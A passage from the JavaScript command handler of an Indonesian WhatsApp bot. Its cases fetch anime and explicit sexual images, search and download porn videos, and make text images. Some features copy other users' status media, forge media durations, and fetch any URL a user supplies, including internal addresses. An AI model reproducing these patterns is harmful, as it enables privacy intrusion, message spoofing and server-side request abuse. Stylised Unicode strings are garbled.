              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'baka':
case 'Baka':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'slap':
case 'Slap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'poke':
case 'Poke':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case 'keta':
case 'Keta':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=${hardi}`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              itsmevall.relayWAMessage(prep)
break
case  'awoo':
case  'Awoo':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'blowjob':
case  'Blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'hentai': 
case  'Hentai': 
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'megumin':
case  'Megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'neko':
case  'Neko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
case  'trapnime':
case  'Trapnime':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
itsmevall.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
break
//Done
case 'nuliskiri':
case 'Nuliskiri':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis๐`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
      
break
case 'nuliskanan':
case 'Nuliskanan':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis๐`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
     
break
case 'foliokanan':
case 'Foliokanan':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis๐`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'xs':
case 'Xs':
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${query}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}โโโโโโโโโโโโโโโ\n\nโ โช *DOWNLOAD*
โ ${prefix}xvideo [link xvid] = Video`
itsmevall.sendMessage(from, anu, text, {quoted: mek})
break
case 'xvideo':
case 'xv':
case 'Xvideo':
case 'Xv':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
itsmevall.sendMessage(from, vid, video, {quoted: mek})
break
case 'xnxx':
case 'Xnxx':
case 'xn':
case 'Xn':
if (!c) return reply('Linknya?')
x = await fetchJson(`https://kocakz.herokuapp.com/api/media/xnxx/detail?url=${c}`)
reply(mess.wait)
vid = await getBuffer(x.result.files.low)
itsmevall.sendMessage(from, vid, video, {quoted: mek})
break
case 'listnulis':
case 'Listnulis':
  reply(`Example ${prefix}nulis tes
  ๐น ${prefix}nulis putra
  ๐น ${prefix}foliokanan putra
  ๐น ${prefix}foliokiri putra
  ๐น ${prefix}nuliskanan putra
  ๐น ${prefix}nuliskiri putta`)
  break
case 'foliokiri':
case 'Foliokiri':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
kon = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=${hardi}`)
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis๐`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐?? Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
break
case 'nsfw':
case 'Nsfw':
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						itsmevall.sendMessage(from, `Bebas Nyari Hentai ๐ฟ`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati Kak')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

          case 'maker2d2': 
          case 'Maker2d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
		case 'maker2d3': 
		case 'Maker2d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
		case 'maker2d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'maker3d': 
			case 'Maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'maker3d2': 
			case 'Maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'maker3d3': 
			case 'Maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'maker3d4': 
			case 'Maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'transformer': 
			case 'Transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'googletxt2':
			case 'Googletxt2':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'battlefield': 
			case 'Battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall|Gans`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'coffeecup': 
			case 'Coffeecup': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'coffeecup2': 
			case 'Coffeecup2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'neon': 
			case 'Neon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
              case 'glow': 
              case 'Glow': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'summer': 
			case 'Summer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'flower': 
			case 'Flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'burn': 
			case 'Burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'quote': 
			case 'Quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Thx Dah Pake`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buffer1, "imageMessage", { thumbnail: buffer1, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
					break
			case 'wooden': 
			case 'Wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
			case 'golden': 
			case 'Golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Vall Gans`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					itsmevall.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./itsmevall.jpg')})
					break
case 'detikvn':
case 'Detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await itsmevall.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						itsmevall.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:fvn})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				case 'Detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						itsmevall.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: fvid})
						fs.unlinkSync(median)
				break
      case "colongsw": //arif
case "Colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;

      case "caripesan":
      case "Caripesan":
        if (!q) return reply("pesannya apa bang?");
        let v = await itsmevall.searchMessages(q, from, 10, 1);
        let s = v.messages;
        let el = s.filter((v) => v.message);
        el.shift();
        try {
          if (el[0].message.conversation == undefined) return;
          reply(`Ditemukan ${el.length} pesan`);
          await sleep(3000);
          for (let i = 0; i < el.length; i++) {
            await itsmevall.sendMessage(from, "Nih pesannya", text, {
              quoted: el[i],
            });
          }
         } catch (e) {
          reply("Pesan tidak ditemukan!");
        }
        break;
      case "lirik":
      case "Lirik":
        if (!q) return reply("lagu apa?");
        let song = await hx.lirik(q);
        sendMediaURL(from, song.thumb, song.lirik);
        break;
      case "otaku":
      case "Otaku":
        if (!q) return reply("judul animenya?");
        let anime = await hx.otakudesu(q);
        rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
        ram = await getBuffer(anime.img);
        itsmevall.sendMessage(from, ram, image, { quoted: mek, caption: rem });
        break;
      case "komiku":
      case "Komiku":
        if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
        let komik = await hx.komiku(q);
        result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`;
        sendMediaURL(from, komik.image, result);
        break;
      case "chara":
      case "Chara":
        if (!q) return reply(`gambar apa?\n${prefix}chara itsmevall`);
        let im = await hx.chara(q);
        let acak = im[Math.floor(Math.random() * im.length)];
        let li = await getBuffer(acak);
        await itsmevall.sendMessage(from, li, image, { quoted: mek });
        break;
      case 'pinterest':
      case 'Pinterest':
        /*if (!q) return reply("gambar apa?");*/
        reply(mess.wait)
        let pin = await hx.pinterest(q);
        let ac = pin[Math.floor(Math.random() * pin.length)];
        let di = await getBuffer(ac);
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `โก๏ธNext`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(di, "imageMessage", { thumbnail: di, })).imageMessage
              buttonsMessage = {footerText:'๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ', imageMessage: imageMsg,
              contentText:`๐๐๐ฃ๐๐๐ฃ ๐๐ช๐ฅ๐ ๐๐ค๐ก๐ก๐ค๐ฌ ๐๐ @k4t4sh1._ โน๏ธ`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
        break;
      case "playstore":
      case "Playstore":
        if (!q) return reply("lu nyari apa?");
        let play = await hx.playstore(q);
        let store = "โโโโโโโโโโโโโโโโโโโโโโโ\n";
        for (let i of play) {
          store += `\n*ใ _PLAY STORE_ ใ*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\nโโโโโโโโโโโโโโโโโโโโโโโ`;
        }
        reply(store);
        break;
      case "on":
      case "On":
        if (!mek.key.fromMe) return;
        offline = false;
        fakestatus(" ```ANDA TELAH ONLINE``` ");
        break;
      case "status":
      case "Status":
        fakestatus(
          `*STATUS*\n${offline ? "> OFFLINE" : "> ONLINE"}\n${
            banChats ? "> SELF-MODE" : "> PUBLIC-MODE"
          }\n${prefixStatus ? "> MULTI-PREFIX" : "> NO-PREFIX"}`
        );
        break;
      case "off":
      case "Off":
        if (!mek.key.fromMe) return;
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        fakestatus(" ```ANDA TELAH OFFLINE``` ");
        break;
      case "get":
      case "Get":
        if (!q) return reply("linknya?");
        fetch(`${args[0]}`)
          .then((res) => res.text())
          .then((bu) => {
            fakestatus(bu);
          });
        break;
      case "kontag":
      case "Kontag":
        if (!mek.key.fromMe) return reply("Khusus Owner ๐ฟ");
        pe = args.join("");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        members_ids = [];
        for (let mem of groupMembers) {
          members_ids.push(mem.jid);
        }
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        itsmevall.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact,
